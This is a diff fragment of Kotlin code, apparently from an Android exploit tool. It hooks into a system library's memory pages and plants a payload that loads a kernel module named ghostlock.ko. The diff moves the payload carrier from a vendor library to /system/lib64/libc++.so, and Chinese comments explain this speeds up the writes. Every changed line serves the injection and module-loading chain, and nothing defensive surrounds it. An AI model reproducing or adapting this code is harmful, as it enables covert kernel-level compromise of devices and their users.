@@ -1257,8 +1257,8 @@ if (hookPlanWords != null && hookPlanWords.size >= 4) {
  * the device (the branch aimed 0x98 past 0xFE628), so take the offset from the plan itself. */
 step("typed: hook landing=" + hookLanding)
 /* 填槽：载荷落进 libc++ 页后由它自己 insmod；槽空着就永远不会有加载（成功历史 dev 的 hook_patch 同款）。 */
-meter.before("Assembled43284.fillPayloadSlots", "carrier=/vendor/lib64/libbinderdebug.so hookFileOffset=0x" + (if (hookPlanWords != null) java.lang.Long.toHexString(hookPlanWords[2]) else "null"))
-val payloadSlots = if (payload != null) hook.fillPayloadSlots(blob = payload, carrierPath = "/vendor/lib64/libbinderdebug.so"   /* 参考 backend_terminal.cpp:321：载体与 ko_target 必须同名（模块经载体 insmod） */, hookFileOffset = hookPlanWords!![2], payloadFileOffset = hookPlanWords!![3], mutexPath = "/dev/df",  /* 参考 hook_patch.hpp:146：kLibcxxMutexPath = "/dev/df"。此处曾是 /dev/dx，且它是**实参** ⇒ 会覆盖默认值 ⇒ 页里一直留旧串（真机已证） */ displaced = if (hookPlanWords != null && hookPlanWords.size >= 4) hookPlanWords[1].toInt() else null) else -9
+meter.before("Assembled43284.fillPayloadSlots", "carrier=/system/lib64/libc++.so hookFileOffset=0x" + (if (hookPlanWords != null) java.lang.Long.toHexString(hookPlanWords[2]) else "null"))
+val payloadSlots = if (payload != null) hook.fillPayloadSlots(blob = payload, carrierPath = "/system/lib64/libc++.so"   /* 载体改可直读文件（/vendor 那份连 shell 都打不开 ⇒ 每块都要 fork helper ⇒ 769×~70ms≈56s）。参考 backend_terminal.cpp:321：载体与 ko_target 必须同名 */, hookFileOffset = hookPlanWords!![2], payloadFileOffset = hookPlanWords!![3], mutexPath = "/dev/df",  /* 参考 hook_patch.hpp:146：kLibcxxMutexPath = "/dev/df"。此处曾是 /dev/dx，且它是**实参** ⇒ 会覆盖默认值 ⇒ 页里一直留旧串（真机已证） */ displaced = if (hookPlanWords != null && hookPlanWords.size >= 4) hookPlanWords[1].toInt() else null) else -9
 meter.after("Assembled43284.fillPayloadSlots", "slots=" + payloadSlots)
 step("typed: hook payload slots=" + payloadSlots)
 meter.before("Assembled43284.writeImage", "offset=0x" + java.lang.Long.toHexString(hookLanding) + " width=16 bytes=" + (payload?.size ?: -1) + " (payload)")
@@ -1329,7 +1329,7 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
             runCatching {
                 val moduleBytes = java.io.File("/data/local/tmp/ghostlock.ko").readBytes()
                 step("typed: module bytes=" + moduleBytes.size)
-                val carrierPath = "/vendor/lib64/libbinderdebug.so"
+                val carrierPath = "/system/lib64/libc++.so"   /* 可直读 ⇒ 写路径走 file_fd 直连（毫秒级）；不可读的 /vendor 载体被迫逐块 fork helper（已实测 23ms/次） */
                 meter.before("Native43284.create", "(module session)")
                 val moduleHandle = Native43284.create()
                 meter.after("Native43284.create", "handle=" + moduleHandle)
